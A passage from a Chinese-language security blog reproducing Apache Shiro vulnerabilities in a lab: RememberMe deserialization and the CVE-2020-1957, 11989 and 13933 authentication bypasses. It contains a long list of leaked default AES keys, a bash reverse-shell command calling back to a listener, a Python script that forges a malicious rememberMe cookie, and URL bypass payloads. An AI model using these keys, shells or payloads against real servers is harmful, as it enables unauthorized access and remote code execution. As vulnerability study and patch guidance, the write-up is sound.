<strong>漏洞利用条件</strong>：</li><li>已知ShiroAES解密密钥。</li><li>开启RememberMe功能。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">一些收集到的key字典:</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA==</span><br><span class="line">fCq+/xW488hMTCD+cmJ3aQ==</span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">1QWLxg+NYmxraMoxAXu/Iw==</span><br><span class="line">25BsmdYwjnfcWmnhAciDDg==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag==</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg==</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA==</span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA==</span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">9AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">OUHYQzxQ/W9e/UjiAGu6rg==</span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA==</span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ==</span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA==</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ==</span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA==</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ==</span><br><span class="line">wGiHplamyXlVB11UXWol8g==</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA==</span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg==</span><br><span class="line">L7RioUULEFhRyxM7a2R/Yg==</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ==</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw==</span><br><span class="line">OY//C4rhfwNxCQAQCrQQ1Q==</span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ==</span><br><span class="line">f/SY5TIve5WWzT4aQlABJA==</span><br><span class="line">bya2HkYo57u6fWh5theAWw==</span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg==</span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg==</span><br><span class="line">ZWvohmPdUsAWT3=KpPqda</span><br><span class="line">YI1+nBV//m7ELrIyDHm6DQ==</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA==</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag==</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA==</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA==</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw==</span><br><span class="line">fsHspZw/92PrS3XrPW+vxw==</span><br><span class="line">XTx6CKLo/SdSgub+OPHSrw==</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ==</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ==</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw==</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ==</span><br><span class="line">Y1JxNSPXVwMkyvES/kJGeQ==</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig==</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg==</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw==</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ==</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg==</span><br><span class="line">Bf7MfkNR0axGGptozrebag==</span><br><span class="line">1tC/xrDYs8ey+sa3emtiYw==</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw==</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA==</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ==</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q==</span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA==</span><br><span class="line">2itfW92XazYRi5ltW0M2yA==</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw==</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag==</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag==</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag==</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg==</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg==</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ==</span><br><span class="line">yNeUgSzL/CfiWw1GALg6Ag==</span><br><span class="line">NGk/3cQ6F5/UNPRh8LpMIg==</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg==</span><br><span class="line">CrownKey==a12d/dakdad</span><br><span class="line">empodDEyMwAAAAAAAAAAAA==</span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw==</span><br><span class="line">YTM0NZomIzI2OTsmIzM0NTueYQ==</span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA==</span><br><span class="line">i45FVt72K2kLgvFrJtoZRw==</span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA==</span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA==</span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw==</span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA==</span><br><span class="line">vXP33AonIp9bFwGl7aT7rA==</span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA==</span><br><span class="line">Z3h6eWd4enklMjElMjElMjE=</span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ==</span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag==</span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q==</span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA==</span><br><span class="line">GAevYnznvgNCURavBhCr1w==</span><br><span class="line">66v1O8keKNV3TTcGPK1wzg==</span><br><span class="line">SDKOLKn2J1j/2BHjeZwAoQ==</span><br></pre></td></tr></table></figure><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>输入正确的账号密码，并选择“记住我”</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B04.png"></p><p>使用bp抓取数据包，查看包内容，可以看到cookie里的rememberme</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B03.png"></p><p>使用nc监听本地的1234端口，最终shell会反弹到这个端口</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B05.png"></p><p>编码一下反弹shell的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-i&gt;&amp;/dev/tcp/192.168.1.6/12340&gt;&amp;1</span><br><span class="line"></span><br><span class="line">-i参数生成交互式shell</span><br><span class="line">&gt;&amp;把标准输入和标准输出重定向到socket</span><br><span class="line">/dev/tcp/192.168.1.6/1234表示bash会对/dev/tcp特殊处理，代表了一个tcpsocket</span><br><span class="line">0&gt;&amp;1将标准输入重定向到标准输出</span><br><span class="line">编码后：bash-c&#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>注：为什么要对反弹shell进行编码？<br>在exec()函数中，”&gt;”管道符是没有意义的，会被解析为其他的意义，而我们的反弹shell命令中又必须使用，所以需要编码。<br>另外，StringTokenizer类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。诸如此类的东西ls”MyDirectory”将被解释为ls’”My’’Directory”‘，空格会失效</p><p>使用ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B02.png"></p><p>使用py脚本生成rememberMe值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shiro.py</span></span><br><span class="line">importsys</span><br><span class="line">importuuid</span><br><span class="line">importbase64</span><br><span class="line">importsubprocess</span><br><span class="line">fromCrypto.CipherimportAES</span><br><span class="line">defencode_rememberme(command):</span><br><span class="line">popen=subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,<span class="string">&#x27;ysoserial-sleep.jar&#x27;</span>,<span class="string">&#x27;JRMPClient&#x27;</span>,command],stdout=subprocess.PIPE)</span><br><span class="line">BS=AES.block_size</span><br><span class="line">pad=lambdas:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">key=base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)//已知的key</span><br><span class="line">iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">file_body=pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext=base64.b64encode(iv+encryptor.encrypt(file_body))</span><br><span class="line">returnbase64_ciphertext</span><br><span class="line">if__name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">payload=encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B01.png"></p><p>将生成的rememberMe值替换原来的值，放包即可</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B0.png"></p><p>反弹shell成功</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><h3 id="CVE-2020-1957-Apacheshiro-lt-1-5-2权限绕过漏洞"><a href="#CVE-2020-1957-Apacheshiro-lt-1-5-2权限绕过漏洞" class="headerlink" title="(CVE-2020-1957)Apacheshiro&lt;1.5.2权限绕过漏洞"></a>(CVE-2020-1957)Apacheshiro&lt;1.5.2权限绕过漏洞</h3><p>在SpringBoot中使用ApacheShiro进行身份验证、权限控制时，攻击者构造一个特殊的http请求，利用ApacheShiro拦截器和SpringBoot对URL(requestURI)的处理的差异化，可以绕过ApacheShiro对SpringBoot中的Servlet的权限控制，绕过Shiro的认证，可以未授权访问敏感路径。</p><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p>Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有<strong>anon</strong>，<strong>authc</strong>等拦截器。</p><ul><li>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</li><li>authc为登录拦截器，一般是需要登录认证才能访问的资源。</li></ul><p>用户可以在Shiro.ini编写匹配URL配置，对匹配的URL将进行拦截检查，这样就能实现对URL的访问控制，提高资源访问的安全性。例如，访问/index.html主页的时候，Shiro将不会对其进行登录判断，因为这是一个需要让访问者能够访问的静态页面，交给anon拦截器处理，此项资源不需要登录就能进行访问。而对于/user/1，/user/2，/user/3，/admin/*等资源接口，authc拦截器将会对其进行登录判断，只有登录认证才能访问资源，目的是保证操作的合法性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在shiro.ini配置文件中，可以这样配置：</span><br><span class="line">[urls]</span><br><span class="line">/index.html = anon</span><br><span class="line">/user/** = authc</span><br><span class="line">/admin/** = authc</span><br><span class="line">知识补充：</span><br><span class="line">Shiro的URL路径表达式为ANT格式，路径通配符支持?，*，**</span><br><span class="line">?：代表匹配一个字符</span><br><span class="line">*：代表匹配零个或多个字符串</span><br><span class="line">**：代表匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure><p>其中<code>*</code>表示匹配零个或多个字符串，<code>/*</code>可以匹配<code>/hello</code>，但匹配不到<code>/hello/</code>因为<code>*</code>通配符无法匹配路径。假设<code>/hello</code>接口设置了authc拦截器，访问<code>/hello</code>将会被进行权限判断，如果请求的URI为<code>/hello/</code>呢，<code>/*</code>URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中<code>/hello</code>形式和<code>/hello/</code>形式的URL访问的资源是一样的。</p><table><thead><tr><th>URL路径</th><th align="center">说明</th></tr></thead><tbody><tr><td><code>/app/*.x</code></td><td align="center">匹配(Matches)所有在app路径下的.x文件</td></tr><tr><td><code>/app/p?ttern</code></td><td align="center">匹配(Matches)/app/pattern和/app/pXttern,但是不包括/app/pttern</td></tr><tr><td><code>/**/example</code></td><td align="center">匹配(Matches)/app/example,/app/foo/example,和/example</td></tr><tr><td><code>/app/**/dir/file.*</code></td><td align="center">匹配(Matches)/app/dir/file.jsp,/app/foo/dir/file.html,/app/foo/bar/dir/file.pdf,和/app/dir/file.java</td></tr><tr><td><code>/**/*.jsp</code></td><td align="center">匹配(Matches)任何的.jsp文件</td></tr></tbody></table><p>属性：<br>最长匹配原则(hasmorecharacters)<br>说明，URL请求<code>/app/dir/file.jsp</code>，现在存在两个路径匹配模式<code>/**/*.jsp和/app/dir/*.jsp</code>，那么会根据模式<code>/app/dir/*.jsp</code>来匹配</p><h4 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h4><h4 id="shiro-lt-1-5-0版本权限绕过"><a href="#shiro-lt-1-5-0版本权限绕过" class="headerlink" title="shiro&lt;1.5.0版本权限绕过"></a>shiro&lt;1.5.0版本权限绕过</h4><p>环境：<a href="https://github.com/lenve/javaboy-code-samples/tree/master/shiro/shiro-basic">https://github.com/lenve/javaboy-code-samples/tree/master/shiro/shiro-basic</a><br>将源码导入javaIDEA中</p><p>首先在pom.xml文件可以看到shiro的版本，把版本修改成1.5.0以下，也可以不修改。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-9.png"></p><p>来到main目录下ShiroConfig.java文件进行修改，将原来的拦截正则修改，添加authc的拦截正则。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;/hello/*&quot;</span>,<span class="string">&quot;authc&quot;</span>);<span class="comment">//访问/hello及以下目录都将由authc进行校验</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-5.png"></p><p>来到LoginController.java文件，在这里修改路由控制器方法，我们选择添加一个方法，同时需要刷新一下Maven。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">importorg.springframework.web.bind.annotation.PathVariable;<span class="comment">//引入方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法的具体实现</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/hello/&#123;currentPage&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">publicStringhello(<span class="meta">@PathVariableIntegercurrentPage</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span><span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//访问成功后返回hello资源内容</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-4.png"></p><p>运行ShiroBasicApplication.java文件<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-6.png"></p><p>访问<a href="http://your-ip:8080/login%EF%BC%8C%E6%98%BE%E7%A4%BA%E6%8F%90%E7%A4%BA%E7%99%BB%E5%BD%95">http://your-ip:8080/login，显示提示登录</a><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-7.png"></p><p>抓包重放查看<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-1.png"></p><p>现在修改请求的URL，尝试正常访问需要鉴权的资源，显示是无法访问的<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-2.png"></p><p>那么我们构造一下，在该资源的URL尾部添加<code>/</code><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-3.png"><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-8.png"></p><p>资源已经能够正常访问了，绕过了shiro的验证<br>当我们通过<strong>敏感路径扫描</strong>后，获取到无权限访问的敏感路径，再构造这样的路径末尾携带<code>/</code>URL将造成未授权访问。</p><p><strong>源码理解</strong></p><p>我们输入的URL首先进入org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver的getChain方法中，被获取请求uri路径，随后触发pathMatches方法进行下一步匹配<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-10.png"></p><p>pathPattern=/hello/*,requestURI=/hello/1/</p><p>后面最终会调用core.src.main.java.org.apache.shiro.util.AntPathMatcher类中的doMatch方法进行传入的requestURI与拦截器表达式进行匹配</p><p>但是，在上面已经提到<code>*</code>表示匹配零个或多个字符串，<code>/*</code>可以匹配<code>/hello</code>，但匹配不到<code>/hello/</code>因为<code>*</code>通配符无法匹配路径。假设<code>/hello</code>接口设置了authc拦截器，访问<code>/hello</code>将会被进行权限判断，如果请求的URI为<code>/hello/</code>呢，<code>/*</code>URL路径表达式将无法正确匹配，放行。所以如果Shiro拦截器表达式不以<code>/</code>结尾，且requestURI以<code>/</code>结尾，判断代码将返回false表示匹配失败，从而绕过Shiro认证。随后进入web框架的spring验证。</p><p>而spring的拦截器在在检测拦截器表达式与requestURI结尾是否为<code>/</code>之后，并没有直接返回false。而是将拦截器表达式结尾添加<code>/</code>，这时拦截器表达式就和我们构造的URL请求一致，所以spring显示匹配成功返回true，放行。</p><p>准确来说该身份验证绕过漏洞是spring＋shiro组合的漏洞，构造的请求要绕过shiro拦截器，还要绕过spring拦截器。但是这个漏洞在shiro-1.5.0版本中被修复了</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><h4 id="shiro-lt-1-5-2版本权限绕过"><a href="#shiro-lt-1-5-2版本权限绕过" class="headerlink" title="shiro&lt;1.5.2版本权限绕过"></a>shiro&lt;1.5.2版本权限绕过</h4><p>上面提到shiro-1.5.0的修复，其实在1.5.2以前的版本验证方式都差不多，所以归类为&lt;1.5.2的漏洞。<br>1.5.0的修复后效果：代码修复方式是通过判断requestURI是否以<code>/</code>为结尾，如果以/结尾的话，则去掉尾部的<code>/</code>符号再与shiro拦截器表达式进行比较。<br>当requestURI为<code>/hello/1/</code>等以<code>/</code>为结尾的URI的时候，都会被清除最后的<code>/</code>号，再进行URL路径匹配。</p><p><strong>简单说一下本此版本的漏洞形成原因：</strong><br>Shiro1.5.0-1.5.1版本在对requestURI的处理是这样的，以分号将传入的URI进行截断，并将分号以及分号后面的数据进行清空，返回分号前面的URI数据，从而让<code>/abc/..;/admin/</code>变为<code>/abc/..</code>，因为不存在<code>/admin/**</code>所以绕过shiro检验进入spring检验。</p><p>但是，Spring对分号处理的方式与Shiro不同，Spring会先获取分号的位置，并检测分号后是否存在<code>/</code>，如果有，将<code>/</code>的位置记录在slashIndex变量中，并将分号前的数据与<code>/</code>之后的数据进行拼接，从而让<code>/abc/..;/admin/</code>变为<code>/abc/../admin/</code>。随后处理，取有效正常路径等待，然后返回处理后的requestURI（此时为<code>/admin/</code>）进行匹配，放行，访问成功。</p><p>同样还是利用了spring+shiro组合中，两者对URL处理方式不同来实现绕过。</p><p>在后来的Shiro1.5.2版本中，在进行decodeAndCleanUriString方法之前会先进行URI解析，调用request.getServletPath()和request.getPathInfo()获取ServletPath和PathInfo并进行路径拼接，避开了spring的decodeAndCleanUriString对于分号的处理，从而修复了此漏洞。</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​       </p><h3 id="CVE-2020-11989-Apacheshiro-lt-1-5-3权限绕过漏洞"><a href="#CVE-2020-11989-Apacheshiro-lt-1-5-3权限绕过漏洞" class="headerlink" title="(CVE-2020-11989)Apacheshiro&lt;1.5.3权限绕过漏洞"></a>(CVE-2020-11989)Apacheshiro&lt;1.5.3权限绕过漏洞</h3><p>此漏洞和CVE-2020-1957类似，都是因为shiro和spring对URL的处理不一致导致的。但是要求对admin资源的匹配符号为<code>*</code>不能是<code>**</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试项目部署于Tomcat。该漏洞成功利用存在下面两个条件：</p><ol><li>项目不能部署在根目录，也就是需要 context-path，设置server.servlet.context-path=/app，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，值得注意的是若Shiro版本小于1.5.2的话那么该条件就不需要。</li><li>Spring控制器中没有另外的权限校验代码</li></ol><p><strong>简单解释漏洞****：</strong></p><p>首先有两种攻击方式：</p><p><strong>第一种</strong><br>获取到无权限访问的敏感路径，在authc认证路径后添加<code>%25%32%66</code>（就是将<code>/</code>进行两次URL编码）进行身份验证绕过。</p><p><strong>第二种</strong><br>获取到无权限访问的敏感路径，在路径的头部添加<code>/;/</code>进行身份验证绕过。</p><ul><li><p>在Shiro1.5.2版本中，对于requestURI处理的方式存在一些不同，对URL进行两次解码，此处也是漏洞触发点所在。Shiro1.5.2使用的是request.getContextPath()，request.getServletPath()，request.getPathInfo()拼接的方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.getRequestURL()：返回全路径；</span><br><span class="line">request.getRequestURI()：返回除去Host部分的路径；</span><br><span class="line">request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空；</span><br><span class="line">request.getServletPath()：返回除去Host和工程名部分的路径；</span><br><span class="line">request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</span><br></pre></td></tr></table></figure><p>假设我们构造URL为/admin/a%25%32%66a由于getServletPath()方法会对requestURI进行一次url解码，在之后的decodeAndCleanUriString方法中进行第二次url解码，所以shiro检测的是/admin/a/a,不在匹配范围内，放行进入到spring boot 。Spring是怎么对其进行解析的，在org.s-pringframework.web.uti.UrlPathHelper#getPathWithinApplication中，将url解析为/toJsonList/a%2fa，还没解码完的URL被当做{name}了，这样其实就表示/admin/{name}中的name值为a%2fa，符合匹配规则，放行。<br>解释一下就是<code>/**</code> 之类的路径匹配配置，匹配路径下的全部访问请求，包括子目录及后面的请求，如：/admin/** 可以匹配 /admin/a 或者 /admin/b/c/d 等请求。</p><p>对于<code>/*</code>的话 ，单个不能跨目录，只能在两个/之间匹配任意数量的字符，如/admin/* 可以匹配 /admin/a 但是不能匹配 /admin/b/c/d。</p><p>所以如果我们将其配置为/admin/*，但是我们访问形如admin/a/b这种路径，此时就会绕过访问权限。</p></li><li><p>我们访问 /;/app/admin/1，最终将成功访问到/app/admin/1这个需要验证身份的资源。利用CVE-2020-1957漏洞原理，shiro以分号截断，所以会将<code>/</code>拿去检验，放行，进入spring，而spring则会截断reqeustURI中分号后的数据，并返回，最终变成选取正确访问路径访问</p><p>当 URL 进入到 Tomcat 时， Tomcat 判断 /;/app/admin/1 为 app 下的 /admin/page  路由，进入到 Shiro 时被 ; 截断被认作为 / ，不再检验,再进入 Spring 时又被正确处理为正常路径app下的 /admin/1  路由，最后导致 Shiro 的权限绕过。</p><p>建议修复方式安装修补补丁或者更新到最新版。</p></li></ul><p>​        </p><h3 id="CVE-2020-13933-Apacheshiro-lt-1-6-0权限绕过漏洞"><a href="#CVE-2020-13933-Apacheshiro-lt-1-6-0权限绕过漏洞" class="headerlink" title="(CVE-2020-13933)Apacheshiro&lt;1.6.0权限绕过漏洞"></a>(CVE-2020-13933)Apacheshiro&lt;1.6.0权限绕过漏洞</h3><p>漏洞简介：<code>Apahce Shiro</code> 由于处理身份验证请求时出错 存在 权限绕过漏洞，远程攻击者可以发送特制的<code>HTTP</code>请求，绕过身份验证过程并获得对应用程序的未授权访问<br>条件：<code>ant</code>风格的路径为<code>*</code>，而<code>**</code>无法绕过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span 